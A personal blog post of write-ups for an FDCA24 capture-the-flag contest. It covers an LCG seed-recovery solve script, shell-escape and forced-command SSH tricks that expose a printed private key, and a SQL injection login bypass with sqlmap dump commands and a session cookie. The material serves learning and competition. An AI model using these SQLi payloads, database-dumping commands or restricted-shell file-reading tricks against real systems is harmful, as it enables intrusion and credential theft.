---
title: 'FDCA24 - Writeups'
description: 'Writeups for the most interesting challenges I solved.'
pubDate: 'Dec 15 2024'
heroImage: '/blog-placeholder-5.jpg'
tags: ['CTF', 'FDCA', 'Web', 'B2R', 'Misc', 'Crypto']
---

This CTF ran as a Christmas calendar with a new challenge releasing every day.
I solved all challenges but have decided to only do a writeup for a select few challenges that I found to be particularly interesting.
![Scoreboard](/src/assets/FDCA24/scoreboard.png)

# Challenges

## Day 12 - Jættelatterens hemmelighed 
###### 1000pts - 20 solves - Medium - Crypto
For this challenge, we're given the following files:
* `jaette_random_tools.py` - Collection of custom "random" tools.
* `iv.bin` - Binary file containing the IV.
* `encryption_output.txt` - Output of encrypt.py.
* `encrypt.py` - Script used to encrypt the flag.
* `cipher.bin` - Binary file containing the encrypted flag.

By starting off with examining ``encryption_output.txt``, we can gather some important information:

```
Secret jætte-key: 
De kommer aldrig igennem vores avancerede krypteringsalgoritme
HuihuheHiihaHeehheHiihaHaeHaaahaHiihaHohhaoHuooHyu
iv.bin not found, creating a default one

Encryption complete and written to 'cipher.bin'
```

From this we know that the IV we are given is the one used for the flag encryption. And we also know the "laugh output".
To figure out what to do with this, we can examine ``encrypt.py``.

```py
from jaette_random_tools import ThorLCG, JaetteAES
import getpass
import hashlib


# Initialize the LCG with exposed parameters
a = 1664525
c = 1013904223
m = 2**32
password = getpass.getpass("Secret jætte-key: ")
seed = int(hashlib.sha256(password.encode()).hexdigest(), 16) % m
rng = ThorLCG(seed, a=a, c=c, m=m)

# Post signature jætte laugh, but make it random to make it more scary
laughparts = [
    "Haaaha",
    "Heehhe",
    "Hiiha",
    "Ha",
    "Huihuhe",
    "Hae",
    "Huoo",
    "Hohhao",
    "Hua",
    "Hyu",
]

print("De kommer aldrig igennem vores avancerede krypteringsalgoritme")

laugh_seed = rng.next()
print("".join([laughparts[int(l)] for l in str(laugh_seed)]))

# Generate a secret key
key = bytes([rng.get_random_byte() for _ in range(16)])  # 128-bit key

# Check that an iv.bin file is present, otherwise make one
try:
    with open("iv.bin", "rb") as iv_file:
        iv = iv_file.read()
except FileNotFoundError:
    print("iv.bin not found, creating a default one")
    # Create a default 
    iv = bytes(rng.get_random_byte() for _ in range(16))
    with open("iv.bin", "wb") as iv_file:
        iv_file.write(iv)

# Encrypt a super secret message using the secret key
with open("message.txt", "r") as message_input_file:
    payload = message_input_file.read()
cipher = JaetteAES(key)
ciphertext = cipher.encrypt(payload)

# Save the ciphertext to a file to be shared with jætte receivers
with open("cipher.bin", "wb") as cipher_file:
    cipher_file.write(ciphertext)

print("\nEncryption complete and written to 'cipher.bin'")
```

Seeing as we have the IV and the output of ``"".join([laughparts[int(l)] for l in str(laugh_seed)])`` we can figure out the seed.

To recover the seed in ``laugh_seed`` we just need to take the index of each ``laughpart``. This gives us the seed ``4212502769``.
This is, however, not the initial seed that we need. To find that we can do a bit of math:

``a_inv = modular_inverse(a, m)``
``seed = (a_inv * (laugh_seed - c)) % m``

This takes the modular inverse to a and am. Then uses that to calculate the initial seed, which turns out to be ``3275362650``.

Now that we have the initial seed, we can recover the key and decrypt the flag. I have collected all of this in one solve script:
```py
import re
from jaette_random_tools import ThorLCG, JaetteAES

def modular_inverse(a, m):
    """Compute the modular inverse of a modulo m."""
    m0, x0, x1 = m, 0, 1
    while a > 1:
        q = a // m
        a, m = m, a % m
        x0, x1 = x1 - q * x0, x0
    if x1 < 0:
        x1 += m0
    return x1

def recover_laugh_seed(laugh_output, laughparts):
    """Recover laugh_seed from the laugh output."""
    # Split laugh_output into parts based on capital letters
    laugh_segments = re.findall(r'[A-Z][a-z]*', laugh_output)

    laugh_digits = []
    
    # Match each segment to its corresponding laughparts index
    for segment in laugh_segments:
        if segment in laughparts:
            laugh_digits.append(laughparts.index(segment))
        else:
            raise ValueError(f"Segment '{segment}' does not match any laughpart!")

    # Combine digits to form laugh_seed
    laugh_seed = int("".join(map(str, laugh_digits)))
    return laugh_seed

def recover_seed(laugh_seed, a=1664525, c=1013904223, m=2**32):
    """Recover the seed (X_0) from the laugh_seed (X_1)."""
    a_inv = modular_inverse(a, m)
    seed = (a_inv * (laugh_seed - c)) % m
    return seed

def recover_key(seed, a=1664525, c=1013904223, m=2**32):
    """Recover the 128-bit key from the seed."""
    rng = ThorLCG(seed, a=a, c=c, m=m)
    rng.next() # Ensure we're on the same state as the original.
    key = bytes([rng.get_random_byte() for _ in range(16)])
    return key.hex()

def decrypt(key):
    """Decrypt the ciphertext using the key."""
    with open("cipher.bin", "rb") as file:
        ciphertext = file.read()
        file.close()
    cipher = JaetteAES(bytes.fromhex(key))
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

laughparts = [
    "Haaaha", # 0
    "Heehhe", # 1
    "Hiiha", # 2
    "Ha", # 3
    "Huihuhe", # 4
    "Hae", # 5
    "Huoo", # 6
    "Hohhao", # 7
    "Hua", # 8
    "Hyu", # 9
]

laugh_output = "HuihuheHiihaHeehheHiihaHaeHaaahaHiihaHohhaoHuooHyu"

laugh_seed = recover_laugh_seed(laugh_output, laughparts)
print("Recovered laugh_seed:", laugh_seed)
recovered_seed = recover_seed(laugh_seed)
print("Recovered initial seed:", recovered_seed)

key = recover_key(recovered_seed)
print("Recovered key:", key)

flag = decrypt(key)
print("Decrypted flag:", flag)
```

Running this gives us the following output:
> Recovered laugh_seed: 4212502769<br>
> Recovered initial seed: 3275362650<br>
> Recovered key: 9c4b2eb590af42b9c45396fd38372a81<br>
> Decrypted flag: Alle Jættestyrker: Husk nu at bruge en god random number generator!<br>
> FDCA{YOU_BROKE_THE_RNG}

And there we have the flag:<br>
``FDCA{YOU_BROKE_THE_RNG}``

## Day 14 - No Command Here - Part 1
###### 1000pts - 11 solves - Medium - Misc
For this challenge we are given two things:
- An SSH connection on ``jættenettet.dk:2222``
- An SSH key named ``loki.priv``

We need to be aware of punycode encoding, so the actual domain is ``xn--jttenettet-d6a.dk``.

To get started, we can SSH into the remote server using the following command:<br>
``ssh loki@xn--jttenettet-d6a.dk -p 2222 -i loki.priv``

Be aware that we need to set the correct permissions of the SSH key first using:<br>
``sudo chmod 666 loki.priv``

Once connected, we are met with the following text:<br>
```
Oh no! Where's my commands?<br>
bash$
```

Almost no matter what we try, we always get an error saying "``No such file or directory``". So it would seem like all of our usual commands are gone.

But since we have a bash shell, we can use the wildcard functionality of bash to figure out the existing files on the server.
For example, the command ``*/`` gives:
```
> archive/: Is a directory
```

We can use this to enumerate the files on the server. For example, ``*.md`` gives the first file ending in ``.md`` which is ``considerations.md``

After a lot of enumeration, we eventually stumble across a hidden directory named ``.c2VjcmV0Ymlu`` which is base64 for "secretbin".
In this hidden folder there is a file named ``bash`` which we can use to get a full proper shell by running:<br>
``./.c2VjcmV0Ymlu/bash --norc``

We still don't have access to things like ``ls`` or ``cat``. But we can use ``echo`` which is going to help a lot.

Using ``echo`` we can easily enumerate all files with:<br>
``echo *``

Which returns:<br>
```
archive bin considerations.md credit.md etc lib lib64 vault
```

By listing the files in the ``vault`` directory, we find the first flag in ``/vault/flag.txt``. But how do we read it without ``cat``?

This is where ``echo`` is going to help us once again. We can simply use the following command to read any file:<br>
``echo "$(<FILE)"``

Which looks like this for the flag:<br>
``echo "$(</vault/flag.txt)"``

And we get the first flag:<br>
``FDCA{Ba5h_Liter4te_y0u_ar3}``

When I initially solved this, I did however, notice that this was just part 1. So I decided to dig further and see how much I could find.
I ended up solving the next two challenges on the same day, before they even released. I will explain the solution to them under the appropriate heading below.

## Day 15 - No Command Here - Part 2
###### 1000pts - 9 solves - Hard - Misc
For this challenge we are continuing where we left off in part 1.

After a lot more enumeration, we can eventually find the ``.ssh`` directory with a bunch of SSH keys:<br>
``echo .ssh/*``
```
.ssh/authorized_keys .ssh/fenrir.echo.priv .ssh/fenrir.id.priv .ssh/fenrir.ls.priv .ssh/fenrir.pwd.priv .ssh/fenrir.ssh.priv
```

This is where it gets interesting. We are given an SSH key tied to a specific command of a user.
The only commands/keys we will need for the solution are ``ls`` and ``ssh``.

By connecting to the server with the ``ls`` key of the new user using ``ssh fenrir@xn--jttenettet-d6a.dk -p 2222 -i ls.priv`` we get a file listing with no usable files.
It is however, possible to pass arguments to this command by supplying them in a string like following:<br>
``ssh fenrir@xn--jttenettet-d6a.dk -p 2222 -i ls.priv " -la"``

This allows us to list hidden files.
By doing this we once again see a ``.ssh`` directory. We can list the contents of it using:<br>
``ssh fenrir@xn--jttenettet-d6a.dk -p 2222 -i ls.priv " .ssh -la"``

This returns the following interesting file:<br>
``vaultkey.encrypted``

In order to read files on the server, we can use the ``SSH`` command key. This takes an SSH config file as a parameter.
This command will print out the line contents of the files if it is not a valid config file. Knowing this, we can read ``vaultkey.encrypted`` with the following command:<br>
``ssh fenrir@xn--jttenettet-d6a.dk -p 2222 -i ssh.priv ".ssh/vaultkey.encrypted"``

This returns a lot of lines that look something like this:
```
.ssh/vaultkey.encrypted line 1: no argument after keyword "fuws2ljnijcuoskoebhvarkoknjuqicqkjevmqkuiuqewrkzfuws2ljnbjrdgqtmmjxe46tbimyx"
```

After cleaning up this output we get the following output:
```
fuws2ljnijcuoskoebhvarkoknjuqicqkjevmqkuiuqewrkzfuws2ljnbjrdgqtmmjxe46tbimyx
ewsynn2gi2sfifaucqkbijdtk5tcnvkucqkbifcwe3jzovnfcqkbifaucqkbifaueqkbifbgy52b
ifauczd2mmzgo5ddnyfe42cbifaucqlxivaucukbifavsrkborztmv3iobhtq4dfkvyuoolpn5vt
qk3voridkm3okj4hu4kmhavxay3kovzgk52bkzixkzcri5nfevkukzqquqsbgqxva532or3vg5kz
nzctaq3tifrew2coofcekzksn5jti3szo5the5cbmjwdsqtwli4wwtdbnrbewnslmjvwm4sugjxe
k3sroncu2ucokm3e6crvlbsxgutokvwgonl2pjrein3ekbytsmdtirdeuu2igzuwkwluj5kuinbx
krxtc5l2kzcfg3rqpbwe66dyoiyfi3lkpfetcutimnuhg6jljbkdsvaknrlgwvscmnfu2tkmlfxx
c4kyknvgsvbvknlgkrdppjjwcl2wm5feq4dblfwvg2dsgrzvcwkbnvzeuusfgbfde3clofkwwssj
n4ze6vcuofje64jvbizfc3zsie4uwwk2jjnfivjwliyvkmcqgfhdgv3qjrhgi3kmgu2wwvsyovlw
cz2ykbigcs2miriswr2hhfwu4nrykfsvevbuofgu6skrhfdfi4luoafdky2jkrvwevjuku4u45zx
in2xkrsdinrtmr32n5ldavlegbkvq2cjpbatss2kgnjuc6srpb3dq6kzgmzukrclo52u64dcinvu
6uczgjhfcts2m5tauvcdo5vwi32qg5wgw2zyijhgm2thjvsfemltgf2vm4lugb5eyysdorjvawdv
mu3fk6kxi5jhe3cif44xeucsjbyswstkmzxuymblozbc6vchim2ewcthk5mxuz3vn5idi2jyjngh
g53gk52eezslga4wsmllpfbxmqkhg5vhq4lcjfigyzsbifaum2kgf5wvg3cwmy2ww4cwifaucqkc
gnhhuykdgf4wgmqkivaucqkhijauyyspnrxwcvdwjnmgys3iozquwssqkbzhevblmq2tay3dgzus
6udrlbeto4jtonaumvkmnzkue3kvkzctcv3hkfhva6ryju3wgrlsbjwuu6coifzecr3zn5kgcz3y
jbvwcrlvjize2sbwg5iuonlgkfrdezs2imzhauktovuw2nkigyyds4dyjiyeyqseir5fk5lkovld
g4sfliyuuwkpmmfdqmtxfmzvintwmrgec6ctkvucw33onvgfi3cbfnhtansomjztcujqoa4u2wsu
onrwcokfgvxtq2kokvmvqslcjv3gqmbpku2vmwsgkfmeg2seimzaus2lofwda3zunmvvk3cym43e
2mdnoyyvsq2sgzlw2stln5qswtcfi5auu4lzkvje4q3eobjxc3ckinjuwttknmydm22uof2wi22l
jztvau3ni5jvocsvgfhw2zcwjzcdsvdegfyvg6syljuswzk2izldo3dnn5dhu6rsnfuxomcqnbuh
mwtkmv3eksdlkuvuw2senfcvausvgzzgczkyinctkrzrj5dfavakmnhxo4tsnbiwo3spnbztmrte
izegirsggrju2ukqknuwimdhjuye2yrpjvwu4olyif4xgtdkoflxo4cenize42svirlvssbqo5zu
usdbiqvtkwskbjiecvcygq2eiscvmrre4ytmmfzgitlzgj3xevlkge3w45lmjvwgq23bgvjc6l3b
piyfentwnfmtgnsdhfihe53ggb4go5kdn5dg2tjujryuik2joyfeg2jxjvedc4srlb4xiuczorne
2z3so5bhknbymfwxsrbvlb3ucqkbifgueqkbivaucqkhifbhgzbpkvguor3oo4ygywkrlevuq2sc
mrthoobtjvdaumzyjjqwik3ynzrwysluiu4eq4thkvlucy2nhayxeu2xnfyu4rrtgvgfan2cirau
uv3uou4vsmzrm53fq4dvmncesl2cnzfewukplf2e6v2kgjihucsjj4vuyy3lo55gurzqja4vasbu
pfvg62sljzygitjplf3g2rslgu2gsocumfifavdyof4ucyjygzcvm4tpfnwg4n2smjexawkfobkh
cn22obje6uykkbavsyjsozjtmm3hhezhozdskzmxqodekeytq23mkneha3dbkv3wkuclin3vutlt
mv3viqsihbvewmkxhftdkndpkbmw432hpbstkzsxjrnek5tfbjftav2vjfkew6tzkr5hc6ccjf2u
c4kfoazgondyivas6mlblbhwizswozzdonliifxtqujqkbtuctsum44e62lggvcxeuttiz3daukn
ouxwoqkwiufdaszvnmvwqs2omyvte2lbojexk53si44c6sd2ijztantiizltitdolfsxms2konmd
kwl2gbtfmtctkrrhcsljjbmgowsgjbmeyzkhm5hww6ruke3quq3fovefiudnirtgk2sqoffwms3u
om4hsmdjm5kdgztdlj3xkqtqfnftaqsokzjtswtqlb2vc3ddhbuusn3uj54uiqsqiz4tcr3sgjyv
autnm5wxictvnbedetsunfuuuzktgjyg2urpkbrdousli5hhmv2snjeeo4szmrhvgtkhljkfmzto
jv4e46kuhfzxqtlfgrsvatrwkzrxeqrugnsw2t2cifaucqiko5cdo2bygrbfqtsifnrugocjifit
ewkmgrxuqwcdg5vvaztjmnzveodomzrwimcqkizc6utzn5fg22keo5jeit2njbsum6cnoncfor3f
lfudsqsdbjvwc6btinqwuvlsnzkdqqjylfuwumcjn5lxuu2nf5tvun2skjtfa3rvgu2emrcjiiyx
mvdqpb3uo2cnmrnde43kkr2egzcnpfititlrmviwcwtwmmfgil2iknfecvkjojge62lygfxgov2e
invdok3bf4zvq6rpnu2xeq2vhblham2cnjwe22ckjvlu6uzqfnvguokron2gu6tzmjmhuulrlezu
wzl2ortqurzpo5cdi3kipbzeor3ijzdhi4swgngdctzxijkeyzkvoiyuw6rtkrhgg4skjnbug6df
gnfxuncmifaucqknivaxs43ckjsfk4kdkevwumsfivhvoctpiq4eytspjrsvemrzi5cgskzwijhg
k4zlgjmtorbunfguwwlugvycwnrwiffxo6shpfgwk43cmi3gqvkmof2humthji2vgqjqomyeem2h
pjxhqnakkbbxmsjqkraw4rdbm5dtin2uiuvxksztnyztkodyjf3fa3swgnqxo4zsgjdg2zk2krzf
o5zqhfew65cnlb5egtttpb2xc3kjnn4xu5cdojhuqzsrbjhxewctgjmgyy3jijlemvdbgvwxqwlx
ie4tewcojbjtqr3dljeucv3ikb3fm2zwnvwgs2dkonlvi22toz4wsv2qou4vo43pojxvguszmvru
sqtvpifgyvdoijstqrrlgrdtstzlgriw6k3wkr2dq6tpgzmxk5lrha2ucqkbif3vcrdnpftew6dx
irdwi5dvgbaucq3ljryeev3qnvbfssbzjfshsmrykftauzblkfjwo2bvpa2u6zkkomvtmz3viexw
mz3ugvsxqusyk5mvc3bxkizgg4kvjn5fmtsdinvhmzdxke2hu6lqmzewevlngzyw46blkzduk5tw
mfteqcsekbzei5scg5fdks3xozgtgoldgbuwcnzuj55domrrmf3eisrpjrlusz3cpflxc33vgu3h
s5btlbjdgutykzshksrwhazfmn2xm5xfewlzgvutqmiknevxe6sejzftczttpfmecwcfjndfmodk
ovkgwmbtnjcu4lzsj4vtgqklk5uwetsvkzleyskvovlesk2nmzgei22novnesmdzouyu623wifhh
av2pbi4g2tsnna3dmskbjyyvmy2bifauctkzgjcxitlkiuyvcrkonbrg23d2ifiusrccifkuoqtx
hu6quljnfuws2rkoiqqe6ucfjzjvgsbakbjesvsbkrcsas2flews2ljnfufa
```

This looks like a bunch of junk at first. After throwing it into [https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier) it turns out to actually be base32.
We can decode this using [https://www.dcode.fr/base-32-encoding](https://www.dcode.fr/base-32-encoding).

This gives us a new SSH key:
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

We can save this key and use it to login as the ``vault`` user:<br>
``ssh vault@xn--jttenettet-d6a.dk -p 2222 -i vault.priv``

Which just prints us the flag:<br>
``FDCA{S5H_Can_B3_M4de_Quit3_Str1ct}``

Since I solved this challenge the day before it released, I was ready to submit when it was released and therefore got a first blood the second it released.

## Day 16 - Jætte Tracker 9000 
###### 1000pts - 21 solves - Easy - Web
This challenge was running on the same server as the previous two, except on port ``8080``.

Upon navigating to the page we are met with a simple login form. If we try to input an SQL injection payload like ``' OR 1=1;-- -``, we get logged in as Thor.
But we do not have permission to do anything further. This points towards the solution relying on more SQLi.

For this we can simply use SQLMap with the following command:<br>
``sqlmap -u http://xn--jttenettet-d6a.dk:8080/ --forms --dump``

This gives us a nice form with credentials of all users. From this we can see that ``Odin`` has the permissions ``1000`` which is higher than any other.
We can therefore login using the credentials:<br>
``odin:3f31941c38e702ee814a381a7a56d8c0``

This lets us login and actually use the search function. This doesn't seem to yield any interesting results manually. Therefore we can try SQLMap again on the new endpoint.
To do this we have to copy our session token so we can test the search function:<br>
``sqlmap -u http://xn--jttenettet-d6a.dk:8080/jaettefinder/ --forms --dump --dbs --cookie="PHPSESSID=051d00b7f63dbbe3b6365948325efcf1"``

This lets us dump everything interesting in the database, including the flag:<br>
``FDCA{N0rd1sk3_gud3r_sk4l_0gsaa_par4m4t3r1ze}``